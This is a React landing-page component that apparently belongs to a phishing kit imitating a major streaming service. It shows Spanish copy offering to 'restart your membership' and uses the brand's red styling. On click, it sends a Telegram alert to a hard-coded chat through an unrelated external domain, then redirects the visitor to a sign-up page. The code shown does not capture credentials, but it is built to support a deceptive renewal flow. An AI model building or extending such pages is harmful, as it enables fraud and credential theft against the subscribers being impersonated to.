import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import Spinner from '../Spinner/Spinner';

function Hero() {
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate(); 

  const sendTelegramMessage = async (message) => {
    try {
      const chatId = '-4783281642'; // Reemplaza con tu chat ID de Telegram
      const response = await fetch('https://streaming.renovapunto.online/enviarmensaje', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ chatId, message }),
      });

      if (!response.ok) {
        throw new Error('Error al enviar el mensaje a Telegram');
      }
    } catch (error) {
      console.error('Error:', error);
    }
  };

  const handleClick = async () => {
    setLoading(true);
    
    try {
      // Enviar mensaje de Telegram
      const message = `🚀 Nuevo usuario intentando reiniciar membresía 🚀`;
      await sendTelegramMessage(message);

      // Esperar un poco antes de navegar
      setTimeout(() => {
        navigate('/signup');
      }, 1000);
    } catch (error) {
      console.error('Error en handleClick:', error);
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center text-white p-4">
      {loading ? (
        <Spinner />
      ) : (
        <>
          <h1 className="text-xl sm:text-2xl font-bold text-center mb-2">
            Películas, series ilimitadas y mucho más
          </h1>
          <h2 className="text-sm sm:text-xs text-center mb-10">
            A partir de $ 16.900. Cancela cuando quieras.
          </h2>
          <button 
            className="bg-[#e50914] text-white text-lg font-bold py-2 px-4 w-full sm:w-56 rounded-sm max-w-md mb-14"
            onClick={handleClick}
          >
            Reinicia tu membresía
          </button>
        </>
      )}
    </div>
  );
}

export default Hero;